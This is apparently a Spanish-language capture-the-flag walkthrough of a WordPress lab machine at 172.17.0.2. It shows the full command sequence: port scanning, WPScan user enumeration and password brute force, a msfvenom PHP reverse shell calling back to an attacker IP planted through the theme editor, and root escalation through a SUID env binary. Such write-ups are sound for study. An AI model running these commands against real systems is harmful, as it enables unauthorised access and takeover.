
Hacemos un primer scaneo para ver que servicios y puertos están levantados
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 172.17.0.2 -oN ScanPorts.txt`

Vemos que esta levantado el puerto `80` navegamos a el vía web.
Accedemos y vemos una pagina básica de apache, vamos ha hacer Fuzing usando [[DIRBUSTER]] y [[GOBUSTER]].

Ya solo con [[DIRBUSTER]] hemos descubierto que es un WORDPRESS
Sabemos que WORDPRESS tienen una pagina de login llamada `wp-login.php` navegaremos a ella, y probamos con el usuario admin y contraseña admin.

Como no son admin admin las credenciales usamos [[WPSCAN]] para hacer una búsqueda de usuarios.
`wpscan --url http://172.17.0.2/wordpress --enumerate u`

Nos muestra que hay un usuario llamado Mario, aremos fuerza bruta para descubrí la contraseña con [[WPSCAN]]
`wpscan --url http://172.17.0.2/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames Mario`

Nos muestra que el usuario es Mario y la contraseña Love
En apariencce theme editor cargaremos el código de un archivo .php generado con [[MSFVENOM]]
`msfvenom -p php/reverse_php LHOST=192.168.1.28 LPORT=443 -f raw > pawned.php`

Una vez hemos copiado el archivo navegamos a su ruta por la URL y nos ponemos en escucha con [[NETCAT]] una vez tenemos establecida la conexión la aseguramos y la tratamos para no perderla.
[[01. Tratamiento de la TTY]]

Una vez tenemos la conexión estable empezamos con la escalada de privilegios con el comando `sudo -l` como no nos da resultado usaremos la segunda opción `find / -perm -4000 2>/dev/null` vemos que se puede ejecutar `/usr/bin/env` así que navegamos a GTFobins y buscamos la explotación para ejecutarla.
`env /bin/sh -p`

Habremos hecho la escalada de privilegios y seremos el usuario root.